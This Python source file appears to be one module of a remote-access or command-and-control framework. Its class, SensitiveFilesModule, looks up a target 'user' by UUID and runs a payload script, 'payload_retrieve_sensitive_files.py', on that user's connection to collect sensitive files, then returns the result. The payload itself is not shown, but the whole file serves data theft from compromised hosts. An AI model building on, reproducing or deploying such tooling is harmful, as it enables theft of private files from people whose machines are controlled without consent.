from dataManager.repository.userRepository import UserRepository
import logging
import ast

class SensitiveFilesModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "sensitive_files_module"
        self.user_repository: UserRepository = user_repository

    async def retrieve(self, uuid):
        user = self.user_repository.get_user(uuid)
        if not user:
            logging.error(f"User with uuid {uuid} not found")
            return
        logging.info(f"Retrieving sensitive files of {uuid}")
        result = await user.execute("./modules/payloads/payload_retrieve_sensitive_files.py")
        return result

